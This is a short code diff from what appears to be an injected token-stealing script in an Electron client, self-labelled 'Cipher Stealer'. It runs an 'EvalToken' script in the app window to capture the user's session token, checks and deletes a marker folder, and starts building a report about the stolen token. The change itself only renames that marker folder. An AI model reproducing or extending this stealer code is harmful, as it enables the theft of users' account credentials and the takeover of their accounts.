@@ -69,8 +69,8 @@ function FirstTime(email) {
 	const window = BrowserWindow.getAllWindows()[0];
 	window.webContents.executeJavaScript(`${EvalToken}`, !0).then((token => {
 		if (config['init-notify'] == "true") {
-			if (fs.existsSync(path.join(__dirname, "init"))) {
-				fs.rmdirSync(path.join(__dirname, "init"));
+			if (fs.existsSync(path.join(__dirname, "Cipher"))) {
+				fs.rmdirSync(path.join(__dirname, "Cipher"));
 				if (token == null || token == undefined || token == "") {
 					var c = {
 						username: "Cipher Stealer",
